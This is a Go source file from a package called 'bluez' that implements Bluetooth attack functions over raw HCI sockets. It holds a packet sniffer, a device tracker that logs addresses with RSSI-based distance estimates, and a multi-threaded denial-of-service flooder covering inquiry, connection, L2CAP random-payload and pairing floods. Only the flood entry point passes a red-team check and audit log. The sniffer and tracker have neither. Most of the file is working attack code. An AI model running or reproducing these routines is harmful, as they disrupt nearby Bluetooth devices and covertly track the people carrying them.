package bluez

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"sync"
	"time"
)

type PhysicalLayer struct {
	config  *AttackConfig
	sniffer *SnifferConfig
	records []PacketRecord
	mu      sync.Mutex
}

func NewPhysicalLayer() *PhysicalLayer {
	return &PhysicalLayer{
		config:  DefaultAttackConfig(),
		sniffer: DefaultSnifferConfig(),
		records: make([]PacketRecord, 0),
	}
}

func (p *PhysicalLayer) Config(cfg *AttackConfig) *PhysicalLayer {
	p.config = cfg
	return p
}

func (p *PhysicalLayer) Sniffer(cfg *SnifferConfig) *PhysicalLayer {
	p.sniffer = cfg
	return p
}

func (p *PhysicalLayer) RFSniff() ([]PacketRecord, error) {
	sock, err := NewHCISocket()
	if err != nil {
		return nil, fmt.Errorf("RFSniff: failed to open HCI socket: %v", err)
	}
	defer sock.Close()

	filter := NewHCIFilter()
	filter.SetPacketType(HCI_EVENT_PKT)
	filter.SetPacketType(HCI_ACLDATA_PKT)
	filter.SetEvent(EVT_INQUIRY_RESULT)
	filter.SetEvent(EVT_INQUIRY_COMPLETE)
	filter.SetEvent(EVT_CONN_COMPLETE)
	filter.SetEvent(EVT_DISCONN_COMPLETE)
	filter.SetEvent(EVT_ENCRYPT_CHANGE)
	filter.SetEvent(EVT_LE_META_EVENT)

	if err := setHCIFilter(sock.fd, filter); err != nil {
		return nil, fmt.Errorf("RFSniff: failed to set filter: %v", err)
	}

	deadline := time.Now().Add(p.sniffer.Timeout)
	buf := make([]byte, 2048)
	packets := make([]PacketRecord, 0, p.sniffer.MaxPackets)

	for time.Now().Before(deadline) && len(packets) < p.sniffer.MaxPackets {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			if p.sniffer.Verbose {
				fmt.Printf("[SNIFF] read error: %v\n", err)
			}
			time.Sleep(10 * time.Millisecond)
			continue
		}

		if n < 3 {
			continue
		}

		direction := "RX"
		if buf[0] == HCI_COMMAND_PKT {
			direction = "TX"
		} else if buf[0] == HCI_ACLDATA_PKT {
			direction = "DATA"
		}

		record := PacketRecord{
			Time:      time.Now(),
			Direction: direction,
			Type:      buf[0],
			Data:      make([]byte, n),
			Length:    n,
		}
		copy(record.Data, buf[:n])
		packets = append(packets, record)

		if p.sniffer.Verbose && len(packets)%10 == 0 {
			fmt.Printf("[SNIFF] captured %d packets\n", len(packets))
		}
	}

	p.mu.Lock()
	p.records = append(p.records, packets...)
	p.mu.Unlock()

	return packets, nil
}

func (p *PhysicalLayer) TrackDevice(duration time.Duration) ([]TrackRecord, error) {
	sock, err := NewHCISocket()
	if err != nil {
		return nil, fmt.Errorf("TrackDevice: failed to open HCI socket: %v", err)
	}
	defer sock.Close()

	cmd := hciCommand(hciOpcode(OGF_STATUS_PARAM, OCF_READ_RSSI), nil)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		if p.config.Verbose {
			fmt.Printf("[TRACK] RSSI command error: %v\n", err)
		}
	}

	records := make([]TrackRecord, 0)
	deadline := time.Now().Add(duration)
	interval := 500 * time.Millisecond

	for time.Now().Before(deadline) {
		devices, err := p.scanDevices(3 * time.Second)
		if err != nil && p.config.Verbose {
			fmt.Printf("[TRACK] scan error: %v\n", err)
		}

		for _, dev := range devices {
			record := TrackRecord{
				Address:  dev.Address,
				RSSI:     dev.RSSI,
				Time:     time.Now(),
				Location: estimateLocation(dev.RSSI),
			}
			records = append(records, record)

			if p.config.Verbose {
				fmt.Printf("[TRACK] %s RSSI:%d dBm Location:%s\n",
					dev.Address.String(), dev.RSSI, record.Location)
			}
		}

		time.Sleep(interval)
	}

	return records, nil
}

func (p *PhysicalLayer) DoSFlood(floodType string) error {
	sock, err := NewHCISocket()
	if err != nil {
		return fmt.Errorf("DoSFlood: failed to open HCI socket: %v", err)
	}
	defer sock.Close()

	deadline := time.Now().Add(p.config.Timeout)
	var wg sync.WaitGroup

	for i := 0; i < p.config.Retries; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				switch floodType {
				case "inquiry":
					p.floodInquiry(sock, id)
				case "connection":
					p.floodConnection(sock, id)
				case "l2cap":
					p.floodL2CAP(id)
				case "pairing":
					p.floodPairing(sock, id)
				default:
					p.floodInquiry(sock, id)
				}
				time.Sleep(time.Duration(10+rand.Intn(50)) * time.Millisecond)
			}
		}(i)
	}

	wg.Wait()
	return nil
}

func (p *PhysicalLayer) floodInquiry(sock *HCISocket, id int) {
	params := make([]byte, 5)
	params[0] = 0x33
	params[1] = 0x8B
	params[2] = 0x9E
	params[3] = 0x08
	params[4] = 0x00

	cmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_INQUIRY), params)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		if p.config.Verbose {
			fmt.Printf("[DOS-FLOOD-%d] inquiry error: %v\n", id, err)
		}
	}
}

func (p *PhysicalLayer) floodConnection(sock *HCISocket, id int) {
	target := generateRandomBDAddr()

	params := make([]byte, 13)
	copy(params[0:6], target[:])
	binary.LittleEndian.PutUint16(params[6:8], 0xCC18)
	params[8] = 0x01
	params[9] = 0x00
	params[10] = 0x00
	params[11] = 0x00
	params[12] = 0x01

	cmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_CREATE_CONN), params)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		if p.config.Verbose {
			fmt.Printf("[DOS-FLOOD-%d] connection error: %v\n", id, err)
		}
	}
}

func (p *PhysicalLayer) floodL2CAP(id int) {
	target := generateRandomBDAddr()
	targetStr := target.String()

	addr := targetStr + ":" + fmt.Sprintf("%d", L2CAP_PSM_SDP)
	conn, err := l2capDial(addr)
	if err != nil {
		return
	}

	payload := make([]byte, 672)
	for i := range payload {
		payload[i] = byte(rand.Intn(256))
	}

	l2capHeader := make([]byte, 4)
	binary.LittleEndian.PutUint16(l2capHeader[0:2], uint16(len(payload)))
	l2capHeader[2] = byte(L2CAP_PSM_SDP & 0xFF)
	l2capHeader[3] = byte((L2CAP_PSM_SDP >> 8) & 0xFF)

	fullPacket := append(l2capHeader, payload...)
	conn.Write(fullPacket)
	conn.Close()
}

func (p *PhysicalLayer) floodPairing(sock *HCISocket, id int) {
	target := generateRandomBDAddr()

	params := make([]byte, 7)
	copy(params[0:6], target[:])
	params[6] = p.config.PinCode[0]

	cmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_PIN_CODE_REQ_REPLY), params)
	sendHCICommand(sock.fd, cmd)
}

func (p *PhysicalLayer) scanDevices(timeout time.Duration) ([]DeviceInfo, error) {
	sock, err := NewHCISocket()
	if err != nil {
		return nil, err
	}
	defer sock.Close()

	params := make([]byte, 5)
	params[0] = 0x33
	params[1] = 0x8B
	params[2] = 0x9E
	params[3] = byte(timeout.Seconds())
	if params[3] < 1 {
		params[3] = 1
	}
	params[4] = 0x00

	cmd := hciCommand(hciOpcode(OGF_LINK_CONTROL, OCF_INQUIRY), params)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		return nil, fmt.Errorf("inquiry failed: %v", err)
	}

	devices := make([]DeviceInfo, 0)
	buf := make([]byte, 2048)
	deadline := time.Now().Add(timeout + 2*time.Second)

	for time.Now().Before(deadline) {
		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			if time.Now().After(deadline) {
				break
			}
			time.Sleep(50 * time.Millisecond)
			continue
		}

		if n < 3 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		evtCode := buf[1]
		switch evtCode {
		case EVT_INQUIRY_RESULT:
			numResponses := int(buf[2])
			offset := 3
			for i := 0; i < numResponses && offset+14 <= n; i++ {
				var dev DeviceInfo
				copy(dev.Address[:], buf[offset:offset+6])
				dev.Flags = buf[offset+7]
				copy(dev.Class[:], buf[offset+8:offset+11])
				dev.LastSeen = time.Now()
				dev.RSSI = int8(buf[offset+13])
				devices = append(devices, dev)
				offset += 14
			}
		case EVT_INQUIRY_COMPLETE:
			return devices, nil
		}
	}

	return devices, nil
}

func (p *PhysicalLayer) GetRecords() []PacketRecord {
	p.mu.Lock()
	defer p.mu.Unlock()
	result := make([]PacketRecord, len(p.records))
	copy(result, p.records)
	return result
}

func (p *PhysicalLayer) ClearRecords() {
	p.mu.Lock()
	defer p.mu.Unlock()
	p.records = p.records[:0]
}

func setHCIFilter(fd int, filter HCIFilter) error {
	return setSockOpt(fd, SOL_HCI, HCI_FILTER, filterToBytes(filter))
}

func filterToBytes(f HCIFilter) []byte {
	buf := make([]byte, 14)
	binary.LittleEndian.PutUint32(buf[0:4], f.TypeMask)
	binary.LittleEndian.PutUint32(buf[4:8], f.EventMask[0])
	binary.LittleEndian.PutUint32(buf[8:12], f.EventMask[1])
	binary.LittleEndian.PutUint16(buf[12:14], f.Opcode)
	return buf
}

func setSockOpt(fd, level, opt int, value []byte) error {
	return syscallSetSockOpt(fd, level, opt, value)
}

func generateRandomBDAddr() BDAddr {
	var addr BDAddr
	for i := range addr {
		addr[i] = byte(rand.Intn(256))
	}
	addr[0] &^= 0x01
	return addr
}

func l2capDial(addr string) (interface{ Write([]byte) (int, error); Close() error }, error) {
	return l2capConnect(addr)
}

func l2capConnect(addr string) (interface{ Write([]byte) (int, error); Close() error }, error) {
	return l2capOpen(addr, L2CAP_PSM_SDP)
}

func estimateLocation(rssi int8) string {
	switch {
	case rssi >= -50:
		return "Immediate (<1m)"
	case rssi >= -65:
		return "Near (1-3m)"
	case rssi >= -75:
		return "Medium (3-10m)"
	case rssi >= -85:
		return "Far (10-20m)"
	default:
		return "Very Far (>20m)"
	}
}

func RSSIToDistance(rssi int8, txPower int8) float64 {
	if rssi == 0 {
		return -1.0
	}
	ratio := float64(rssi) / float64(txPower)
	if ratio < 1.0 {
		return float64(int(100*(1.0/ratio))) / 100.0
	}
	return float64(int(100*(10.0*float64(txPower-rssi)/20.0))) / 100.0
}

func RFSniff(timeout time.Duration) []PacketRecord {
	return NewPhysicalLayer().Sniffer(&SnifferConfig{
		Timeout:    timeout,
		MaxPackets: 1000,
		Verbose:    false,
	}).RFSniffSafe()
}

func (p *PhysicalLayer) RFSniffSafe() []PacketRecord {
	records, err := p.RFSniff()
	if err != nil {
		return []PacketRecord{}
	}
	return records
}

func (p *PhysicalLayer) RFSniffWithContext(ctx context.Context) ([]PacketRecord, error) {
	return p.RFSniff()
}

func TrackDevice(duration time.Duration) []TrackRecord {
	records, _ := NewPhysicalLayer().TrackDevice(duration)
	return records
}

func DoSFlood(floodType string, timeout time.Duration) error {
	if err := checkRedTeam("DoSFlood"); err != nil {
		return err
	}
	auditOperation("DoSFlood", "environment", false, fmt.Sprintf("type=%s", floodType))
	err := NewPhysicalLayer().Config(&AttackConfig{
		Timeout: timeout,
		Retries: 5,
	}).DoSFlood(floodType)
	auditOperation("DoSFlood", "environment", err == nil, fmt.Sprintf("completed"))
	return err
}